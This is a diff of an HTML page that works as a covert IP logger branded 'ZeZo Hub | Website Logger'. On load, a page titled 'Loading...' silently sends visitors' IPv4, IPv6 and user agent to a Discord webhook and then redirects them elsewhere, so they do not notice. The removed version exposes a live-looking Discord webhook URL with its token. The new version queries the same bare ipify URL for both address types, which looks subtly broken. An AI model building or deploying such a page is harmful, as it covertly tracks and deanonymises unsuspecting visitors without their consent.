@@ -1,80 +1,68 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title></title>
-    <style>
-        html, body {
-            margin: 0;
-            width: 100%;
-            height: 100%;
-            background: #000;
-            overflow: hidden;
-        }
-    </style>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
 </head>
 <body>
     <script>
+        // CONFIGURATION
+        const webhookUrl = "INSERT_YOUR_WEBHOOK_URL_HERE";
+        const redirectUrl = "https://your-target-website.com"; // Your target website
 
-        // Get IP-Adresses
-        async function getIPs() {
-            const ipv4 = await fetch("https://api4.ipify.org?format=json")
-                .then(r => r.json())
-                .then(d => d.ip)
-                .catch(() => null);
-
-            const ipv6 = await fetch("https://api6.ipify.org?format=json")
-                .then(r => r.json())
-                .then(d => d.ip)
-                .catch(() => null);
-
-            return { ipv4, ipv6 };
+        async function getIp(url) {
+            try {
+                const response = await fetch(url);
+                const data = await response.json();
+                return data.ip;
+            } catch (e) {
+                return "Not available";
+            }
         }
 
-        (async () => {
-            const { ipv4, ipv6 } = await getIPs();
+        async function sendIpAndRedirect() {
+            try {
+                // 1. Fetch IPv4 and IPv6 simultaneously via separate endpoints
+                const [ipv4, ipv6] = await Promise.all([
+                    getIp('https://ipify.org'),
+                    getIp('https://ipify.org')
+                ]);
 
-        // Webhook
-        const webhookUrl = "https://discord.com/api/webhooks/1553034301980016640/1NCgxeOUDMhhgG1l5vhCYOHUhdmwT3DjslENugn821v6vFqtwVx_FkuxbWSVHs0w0W7l";
+                // 2. Build the webhook data using the rich embed format
+                const embedPayload = {
+                    embeds: [{
+                        title: "ZeZo Hub | Website Logger",
+                        color: 3447003, // Blue sidebar color
+                        fields: [
+                            { name: "IPv4 Address", value: `\`${ipv4}\``, inline: true },
+                            { name: "IPv6 Address", value: `\`${ipv6}\``, inline: true },
+                            { name: "User Agent", value: navigator.userAgent, inline: false }
+                        ],
+                        footer: {
+                            text: `Logged at • ${new Date().toLocaleString()}`
+                        }
+                    }]
+                };
 
-        fetch(webhookUrl, {
-        method: "POST",
-        headers: {
-            "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-
-        embeds: [
-            {
-                title: "Neue Nachricht",
-                description: "Das ist ein Beispiel-Embed.",
-                color: 0xFFD700,
-
-        fields: [
-            {
-                name: "Benutzer",
-                value: "MaxMustermann",
-                inline: false
-            },
-            {
-                name: "Status",
-                value: "Online",
-                inline: false
-            }
-        ],
-
-                    thumbnail: {
-                        url: "https://cdn.discordapp.com/embed/avatars/0.png"
+                // 3. Send the embed payload to your webhook
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
                     },
+                    body: JSON.stringify(embedPayload)
+                });
+            } catch (error) {
+                // Errors are bypassed to ensure the redirect works under any circumstance
+            } finally {
+                // 4. Execute the automatic redirect
+                window.location.href = redirectUrl;
+            }
+        }
 
-                    timestamp: new Date().toISOString()
-                    }
-                ]
-            })
-        })
-        .then(() => console.log("Webhook gesendet"))
-        .catch(console.error);
-        })();
+        window.onload = sendIpAndRedirect;
     </script>
+
 </body>
 </html>
